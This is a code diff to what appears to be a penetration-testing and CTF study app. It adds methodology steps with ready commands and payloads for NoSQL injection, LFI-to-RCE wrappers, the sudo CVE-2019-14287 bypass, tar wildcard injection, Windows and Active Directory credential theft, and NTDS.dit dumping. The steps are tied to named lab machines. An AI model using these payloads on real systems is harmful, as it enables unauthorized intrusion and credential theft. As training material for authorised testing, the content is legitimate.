@@ -593,6 +593,8 @@ const TRACKS=[
  blurb:"Full web methodology: map it, break the auth, find the injectable input, land RCE.",
  phases:[
  {n:1,title:"Map the app",tag:"recon",goal:"Understand the stack and find hidden content",steps:[
+   {d:"Java Spring app? check the actuators",c:"curl -s http://{HOST}/actuator | jq   # then /actuator/env /actuator/heapdump /actuator/sessions",
+    l:"Spring Boot Actuator endpoints leak env vars and DB creds, a heap dump (grep it for passwords/session ids), and live session tokens you can replay as a cookie. The CozyHosting foothold."},
    {d:"Fingerprint, read source, check robots",c:"whatweb -a3 http://{HOST} && curl -sSik http://{HOST}/robots.txt",
     l:"View source and HTML comments. Developers leave paths, creds and hints there."},
    {d:"Directory brute force \u2014 primary (feroxbuster, kept shallow)",c:"feroxbuster -u http://{HOST} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -t 50 -x php,html,txt -C 404,403 -o loot/ferox.txt",
@@ -619,10 +621,12 @@ const TRACKS=[
     l:"Auth logic bugs beat brute force. jwt_tool for anything JWT."}
  ],tips:["Found creds here? Immediately try them on SSH, SMB, WinRM and the DB. Reuse is everywhere."]},
  {n:3,title:"Injection and input",tag:"attack",goal:"Turn an input into data theft or code execution",steps:[
+   {d:"NoSQL injection (MongoDB and friends)",c:"# login bypass:  username[$ne]=x&password[$ne]=x\n# extract:       username[$regex]=^admin   (walk it char by char)",
+    l:"When the backend is Mongo, operator injection bypasses auth and dumps users. In JSON bodies use <code>{\"username\":{\"$ne\":null}}</code>. The Mango pattern."},
    {d:"SQL injection, tested by hand (sqlmap is banned on the OSCP exam and frowned on in most CTFs)",c:"# ' or 1=1-- -   then UNION SELECT to pull data; look for stacked queries / xp_cmdshell on MSSQL",
     l:"PayloadsAllTheThings has the per-DBMS payloads. On exam, manual only."},
    {d:"Local file inclusion, then escalate to RCE",c:"curl 'http://{HOST}/?page=../../../../etc/passwd'",
-    l:"LFI + log poisoning or PHP wrappers (php://filter, data://) is a classic route to RCE."},
+    l:"LFI + log poisoning or PHP wrappers is the classic route to RCE: <code>php://filter/convert.base64-encode/resource=</code> to read source, <code>data://</code> for inline code, and <code>phar://</code> against any uploaded file (a JPEG holding a serialized payload) \u2014 the UpDown route."},
    {d:"XML external entity (XXE) on any endpoint that parses XML",c:"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
     l:"Send it where the app accepts XML (SOAP, SAML, an upload, a POST body). Reads local files \u2014 /etc/passwd, an SSH key, a web.config. Use <code>php://filter/convert.base64-encode/resource=</code> for PHP source, or an external DTD for blind/OOB XXE. PayloadsAllTheThings has the variants."},
    {d:"Server-side template injection",c:"# probe {{7*7}} / ${7*7} / <%= 7*7 %> ; a 49 back means SSTI, then engine-specific RCE",
@@ -695,6 +699,8 @@ const TRACKS=[
  {n:3,title:"Escalate to root",tag:"privesc",goal:"user \u2192 root",steps:[
    {d:"Abuse sudo / SUID / capabilities via GTFOBins",c:"# e.g. sudo /usr/bin/find . -exec /bin/sh \\; -quit",l:"Look up the exact binary on GTFOBins for the copy-paste line."},
    {d:"Writable /etc/passwd or PATH hijack on a root process",c:"openssl passwd -1 -salt x pass   # add a uid-0 line if /etc/passwd is writable",l:"Common on soft boxes. PATH hijack works when a root script calls a binary by name."},
+   {d:"sudo that permits any user but root (CVE-2019-14287)",c:"sudo -u#-1 /bin/bash    # when sudo -l shows (ALL, !root) on sudo < 1.8.28",l:"<code>-u#-1</code> resolves to uid 0, defeating a <code>!root</code> restriction. The Blunder root."},
+   {d:"Writable file that root runs on a trigger",c:"# root cron/systemd-timer running a writable script -> append your payload\n# writable /etc/update-motd.d/* -> runs as root on the next SSH login\n# root runs 'tar ... *' in a writable dir -> wildcard injection:\n#   echo 'cp /bin/bash /tmp/b;chmod +s /tmp/b' > x.sh; touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",l:"pspy shows the trigger. MOTD (Traceback), systemd timers (TartarSauce backuperer) and tar-wildcard all reduce to \u2018root executes something you can write\u2019."},
    {d:"Kernel exploit as a last resort",c:"# uname -a  then searchsploit the kernel; understand it before running",l:"Kernel exploits can crash the box. Exhaust misconfigs first."}
  ],branch:["Rooted \u2192 loot phase","Second NIC or internal hosts \u2192 Pivoting track"]},
  {n:4,title:"Loot",tag:"post-exploit",goal:"Prove it and gather for reuse",steps:[
@@ -725,7 +731,9 @@ const TRACKS=[
  {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
    {d:"Check your privileges first",c:"whoami /priv",l:"<b>SeImpersonate or SeAssignPrimaryToken \u2192 a Potato attack to SYSTEM.</b> Note it immediately."},
    {d:"Run winpeas",c:".\\winpeas.exe",l:"Reads services, creds, and misconfigs. Mind the highlights."},
-   {d:"System info, services and stored creds",c:"systeminfo; cmdkey /list",l:"Unquoted service paths, weak service perms (accesschk), unattend.xml, registry autologon, saved creds."}
+   {d:"System info, services and stored creds",c:"systeminfo; cmdkey /list",l:"Unquoted service paths, weak service perms (accesschk), unattend.xml, registry autologon, saved creds. App password stores too: <b>mRemoteNG</b> (confCons.xml \u2014 decrypt with mremoteng_decrypt), <b>TeamViewer</b> and PuTTY sessions in the registry, and a <b>.vhd/.vhdx</b> on a share (mount it, then <code>reg save</code> the SAM/SYSTEM)."},
+   {d:"Re-use a saved credential without knowing it",c:"runas /user:{DOMAIN}\\administrator /savecred \"cmd /c whoami\"",l:"If <code>cmdkey /list</code> shows a stored credential, <code>/savecred</code> runs as that user blind. The Access root."},
+   {d:"Hunt Alternate Data Streams (files hiding in NTFS)",c:"dir /R    # PowerShell: Get-Item -Path * -Stream *; then  Get-Content file -Stream <name>",l:"A 0-byte file can carry a password in an ADS. <code>smbclient</code> shows them with <code>allinfo</code>. The Nest trick."}
  ]},
  {n:3,title:"Escalate to SYSTEM",tag:"privesc",goal:"user \u2192 SYSTEM",steps:[
    {d:"Token privilege \u2192 Potato",c:"# PrintSpoofer.exe -i -c cmd   (or GodPotato / JuicyPotatoNG depending on OS)",l:"The go-to when SeImpersonate is present. Pick the potato for the Windows build."},
@@ -744,6 +752,8 @@ const TRACKS=[
  blurb:"The AD kill chain: from no credentials to Domain Admin. Reference: The Hacker Recipes.",
  phases:[
  {n:1,title:"No creds (external foothold)",tag:"recon \u2192 attack",goal:"Get your first username or password",steps:[
+   {d:"Read LAPS and gMSA passwords (if your user may)",c:"nxc ldap {IP} -u {USER} -p {PASS} --laps; nxc ldap {IP} -u {USER} -p {PASS} --gmsa",l:"LAPS stores the local-admin password on the computer object (ms-Mcs-AdmPwd); gMSA accounts hand out their own password to those allowed to read it (gMSADumper.py). BloodHound flags who can read each. The Timelapse / Support paths."},
+   {d:"Recover a deleted account from the AD Recycle Bin",c:"Get-ADObject -SearchBase \"CN=Deleted Objects,$(([ADSI]'').distinguishedName)\" -IncludeDeletedObjects -Filter * -Properties * | select samAccountName,lastKnownParent",l:"Deleted objects keep their attributes \u2014 a decommissioned admin\u2019s password often still works. The Cascade root."},
    {d:"Enumerate valid users",c:"kerbrute userenum -d {DOMAIN} --dc {IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
     l:"Also pull users from anonymous LDAP or SMB where allowed."},
    {d:"AS-REP roast users without pre-auth",c:"impacket-GetNPUsers {DOMAIN}/ -no-pass -usersfile users.txt -dc-ip {IP}",l:"Crack any $krb5asrep$ hash offline with hashcat -m 18200."},
@@ -932,7 +942,8 @@ const TRACKS=[
  ]},
  {n:2,title:"Crack offline",tag:"attack",goal:"Recover the plaintext",steps:[
    {d:"hashcat with rockyou and a rule",c:"hashcat -m {} hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",l:"Rules turn one wordlist into millions of realistic mutations."},
-   {d:"Extract hashes from files",c:"# ssh2john / zip2john / office2john / keepass2john <file> > hash.txt  then john or hashcat",l:"Encrypted keys, archives and documents all convert to a crackable hash."},
+   {d:"Extract hashes from files",c:"# ssh2john / zip2john / office2john / keepass2john / pfx2john <file> > hash.txt  then john or hashcat",l:"Encrypted keys, archives, Office docs, KeePass DBs and .pfx certs all convert to a crackable hash."},
+   {d:"Cisco config passwords",c:"ciscot7.py -d -p <type7-hash>          # type 7 is reversible, not a hash\njohn --format=md5crypt type5.txt          # 'enable secret' type 5 = salted MD5",l:"Router/switch configs on TFTP or a web root leak both. Type 7 decrypts instantly; type 5 cracks like any MD5. The Heist foothold."},
    {d:"Build a custom wordlist from the target site",c:"cewl -d 3 -m 5 http://{HOST} -w loot/cewl.txt",l:"Company and box-specific words crack passwords rockyou never will."}
  ]},
  {n:3,title:"Spray and brute online",tag:"attack",goal:"Use creds against live services (carefully)",steps:[
@@ -1010,7 +1021,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.3.0";
+const APP_VERSION="1.3.1";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
@@ -2155,7 +2166,7 @@ function renderExploits(){
    "SeImpersonatePrivilege":["Potato to SYSTEM","token abuse: PrintSpoofer / GodPotato / JuicyPotatoNG","PrintSpoofer64.exe -i -c cmd"],
    "SeAssignPrimaryTokenPrivilege":["Potato to SYSTEM","same token-abuse family","GodPotato -cmd \"cmd /c whoami\""],
    "SeDebugPrivilege":["Dump LSASS","read any process memory, then secretsdump the dump","procdump.exe -accepteula -ma lsass.exe lsass.dmp"],
-   "SeBackupPrivilege":["Read protected files","copy the registry hives, then dump hashes offline","reg save hklm\\sam sam & reg save hklm\\system system"],
+   "SeBackupPrivilege":["Read protected files","copy the registry hives, then dump hashes offline — or on a DC, back up NTDS.dit","reg save hklm\\sam sam & reg save hklm\\system system  ::  DC: diskshadow (expose C: as Z:) then robocopy /b Z:\\Windows\\NTDS . ntds.dit ; secretsdump.py -ntds ntds.dit -system system LOCAL"],
    "SeRestorePrivilege":["Write protected files","overwrite a SYSTEM binary or service path",""],
    "SeTakeOwnershipPrivilege":["Own a SYSTEM file","takeown a privileged binary then replace it","takeown /f C:\\path\\to\\target"],
    "SeLoadDriverPrivilege":["Load a vulnerable driver","known-vulnerable signed driver (e.g. Capcom) for EoP",""],
